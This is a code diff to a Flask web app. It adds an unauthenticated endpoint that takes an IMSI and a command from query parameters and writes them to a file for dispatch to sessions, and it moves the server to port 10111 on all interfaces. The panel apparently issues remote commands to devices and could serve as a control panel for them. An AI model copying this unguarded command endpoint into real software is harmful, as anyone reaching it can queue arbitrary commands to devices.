@@ -1,5 +1,5 @@
-from flask import Flask, render_template
-import json
+from flask import Flask, render_template, request
+import json, socket
 
 class Web(object):
     def __init__(self):
@@ -7,6 +7,25 @@ class Web(object):
 
     def start(self):
         app = Flask(__name__)
+
+        @app.route('/api/querysender')
+        def sendapi():
+            imsi = request.args.get("imsi")
+            cmd = request.args.get("cmd")
+
+            payload = {
+                f"{imsi}": {
+                    "data": f"{cmd}"
+                }
+            }
+
+            with open("./data/sendinfo.txt", 'w') as f:
+                ppayload = json.dumps(payload)
+                f.write(ppayload)
+                f.close()
+
+            return "The command has been sent!"
+
         
         @app.route('/api/getsessions')
         def state():
@@ -19,4 +38,4 @@ class Web(object):
         def panel():
             return render_template("index.html")
 
-        app.run(host="0.0.0.0", port=8080)
+        app.run(host="0.0.0.0", port=10111)
